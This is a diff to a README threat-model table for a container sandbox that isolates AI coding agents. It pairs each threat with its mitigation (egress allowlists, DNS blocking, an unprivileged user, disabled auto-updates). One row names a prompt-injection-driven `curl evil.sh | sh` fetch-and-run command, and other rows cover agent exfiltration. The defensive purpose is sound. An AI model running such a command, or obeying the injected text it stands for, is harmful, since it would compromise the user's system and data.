@@ -89,7 +89,7 @@ Customize:
 | Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist with default DROP and domain whitelist for both IPv4 and IPv6. |
 | DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
-| Malicious npm post-install scripts | Run as UID 1000 inside the container; no access to unmounted host paths. |
+| Malicious npm post-install scripts | Run as the unprivileged `agent` user (host-matched for Docker/Podman on Linux); no access to unmounted host paths. |
 | Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `disable_update_check = true` for Codex. OpenCode config is not currently sanitized; see `TODO.md`. |
 | Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
 | API token leakage via process environment | Default forwarded agent tokens are passed through mounted credential files, not environment variables; host staging files are kept under a private `/tmp` directory. Explicit `--api-key-env*` injection is opt-in, requires `--no-forward-credentials`, and redacts dry-run output, but the selected keys are still present in the runtime process environment during real runs. |
